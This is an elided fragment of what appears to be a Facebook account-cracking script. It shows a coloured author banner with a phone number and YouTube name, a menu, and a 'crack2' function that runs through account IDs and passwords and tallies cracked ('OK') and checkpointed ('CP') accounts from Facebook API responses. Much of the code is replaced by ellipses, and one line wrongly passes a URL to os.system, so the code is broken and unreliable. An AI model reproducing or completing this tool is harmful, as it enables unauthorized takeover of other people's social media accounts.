...
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Author       \x1b[92;1m=>      \x1b[93;1mTanim hossin
\x1b[93;1m Whatsapp     \x1b[92;1m=>      \x1b[93;1m+8801851041015
\x1b[93;1m YouTube       \x1b[92;1m=>      \x1b[93;1mTanim official
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
...
def menu(): #Bilo
	...
	if farhan in ['1','01']:
		...
		os.system("https://www.facebook.com/cyber.king.tanim")
		exit()
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s [TANIM] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [TANIM-CP] %s|%s        '%(b,idf,pw))
